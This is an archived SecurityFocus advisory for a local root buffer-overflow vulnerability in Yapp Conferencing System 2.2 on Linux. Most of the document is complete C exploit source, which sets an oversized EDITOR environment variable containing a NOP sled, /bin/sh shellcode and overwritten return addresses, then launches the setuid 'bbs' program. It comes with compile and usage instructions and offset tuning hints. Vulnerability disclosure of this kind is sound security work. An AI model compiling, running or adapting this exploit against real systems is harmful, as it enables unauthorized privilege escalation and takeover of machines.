source: http://www.securityfocus.com/bid/365/info


Armidale Software's Yapp Conferencing System is vulnerable to an environment variable related buffer overflow vulnerability in (at least) the Linux version. The consequence of the vulnerability being exploited is a local root compromise.


/*
 * Exploit for "Yapp Conferencing System, Version 2.2".
 * By Dave Bowman, for Sandra, on January 13 1998.
 *
 * Description:
 *
 * The Yapp Conferencing System client handles environment variables
 * without doing bounds checking, allowing one to overflow a buffer
 * in the "bbs" executable onto the stack. Using this technique, it
 * possible to obtain a shell running as the user which Yapp is setuid
 * to (in some cases, root).
 *
 * Usage:
 *
 * bash$ gcc -o yapp_exploit yapp_exploit.c
 * bash$ ./yapp_exploit
 * bash#
 * You'll have to change the definition of "BBS_PROGRAM" in the source.
 * You may also need to alter the offset, but -1000 worked for me.
 *
 * And without further ado...
 *
 */

#if ! defined (__i386__) || ! defined (__linux__)
#error Intel 80x86/Linux platform required.
#endif

#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>

#define BUFFSIZE        512 - strlen ("EDITOR=")        /* Size of buffer. */
#define OFFSET          -1000                           /* Offset. */
#define BBS_PROGRAM     "/home/dave/yapp/bbs"           /* Path to program. */

/* Function which returns the base address of the stack. */
long get_esp (void)
{
    __asm__ ("movl %esp, %eax\n");
}

/* Machine code instructions to execute /bin/sh, I had them here in */
/* global for a reason and now I just don't feel like playing with */
/* the stack offset anymore. */
unsigned char exec_shell [] =
    "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
    "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
    "\x80\xe8\xdc\xff\xff\xff/bin/sh";

/* Main function, duh. */
int main (void)
{
    unsigned char buff [518];               /* Buffer to hold our data. */
    unsigned char *ptr;                     /* Pointer. */
    int count;                              /* Counter. */
    unsigned long *address_ptr;             /* Long pointer. */

    /* First we fill the buffer with NOP instructions. */
    (void) memset (buff, 0x90, sizeof (buff));

    /* Then we copy our shell code into the buffer. */
    ptr = buff;
    ptr += BUFFSIZE - strlen (exec_shell);

    for (count = 0; count < strlen (exec_shell); count++)
        *ptr++ = exec_shell [count];

    /* Now we insert our return address into ebp and eip. */
    address_ptr = (unsigned long *) &buff [509];

    for (count = 0; count < 2; count++)
        *address_ptr++ = get_esp () + OFFSET;

    /* Here we terminate the buffer as a string... */
    ptr = (unsigned char *) address_ptr;
    *ptr = '\0';

    /* And attempt to load it into our environment. */
    unsetenv ("EDITOR");

    if (setenv ("EDITOR", buff, 1)) {
        perror ("setenv");
        exit (1);
    }

    /* Finally, we execute Yapp. */
    (void) execl (BBS_PROGRAM, BBS_PROGRAM, NULL);
    perror (BBS_PROGRAM);
    exit (1);
}